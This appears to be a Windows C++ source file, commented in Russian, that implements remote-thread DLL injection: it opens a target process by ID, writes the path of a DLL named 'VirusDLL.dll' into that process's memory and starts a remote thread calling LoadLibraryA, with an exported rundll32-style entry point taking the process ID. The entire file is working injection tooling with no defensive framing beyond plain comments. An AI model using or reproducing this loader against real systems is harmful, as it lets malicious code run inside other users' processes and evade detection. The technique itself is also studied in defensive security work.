
#include <Windows.h>
#include <winerror.h>

void DllInjector(DWORD dwProcessID)
{
    wchar_t wszBuff[100];
    char szDLLPathToInject[] = { "VirusDLL.dll" };
    int nDLLPathLen = lstrlenA(szDLLPathToInject);
    int nTotBytesToAllocate = nDLLPathLen + 1; // включая завершающий нулевой символ.

    // 0. Открываем процесс.
    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, dwProcessID);

    // 1. Выделяем память в удалённом процессе.
    LPVOID lpHeapBaseAddress1 = VirtualAllocEx(hProcess, NULL, nTotBytesToAllocate, MEM_COMMIT, PAGE_READWRITE);

    // 2. Записываем путь к DLL в выделенную память удалённого процесса.
    SIZE_T lNumberOfBytesWritten = 0;
    WriteProcessMemory(hProcess, lpHeapBaseAddress1, szDLLPathToInject, nTotBytesToAllocate, &lNumberOfBytesWritten);

    // 3.0. Получаем адрес функции LoadLibraryA из Kernel32.dll.
    LPTHREAD_START_ROUTINE lpLoadLibraryStartAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"Kernel32.dll"), "LoadLibraryA");

    // 3.1. Вызываем LoadLibraryA в удалённом процессе, передавая адрес памяти с путём к DLL.
    CreateRemoteThread(hProcess, NULL, 0, lpLoadLibraryStartAddress, lpHeapBaseAddress1, 0, NULL);

    CloseHandle(hProcess);
}

extern "C"
{
    __declspec(dllexport) void WINAPI HelperFunc(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
    {
        DllInjector(atoi(lpszCmdLine));
    }
}

BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  // дескриптор модуля DLL
    DWORD fdwReason,     // причина вызова
    LPVOID lpvReserved)  // зарезервировано
{
    // Выполняем действия в зависимости от причины вызова.
    switch (fdwReason)
    {
    case DLL_PROCESS_ATTACH:
        // Инициализация при подключении DLL к новому процессу.
        // Возврат FALSE отменит загрузку DLL.
        break;

    case DLL_THREAD_ATTACH:
        // Выполняем инициализацию для потока.
        break;

    case DLL_THREAD_DETACH:
        // Выполняем очистку для потока.
        break;

    case DLL_PROCESS_DETACH:

        if (lpvReserved != nullptr)
        {
            break; // Не выполняем очистку при завершении процесса.
        }

        // Выполняем необходимую очистку.
        break;
    }
    return TRUE;  // DLL_PROCESS_ATTACH обработан успешно.
}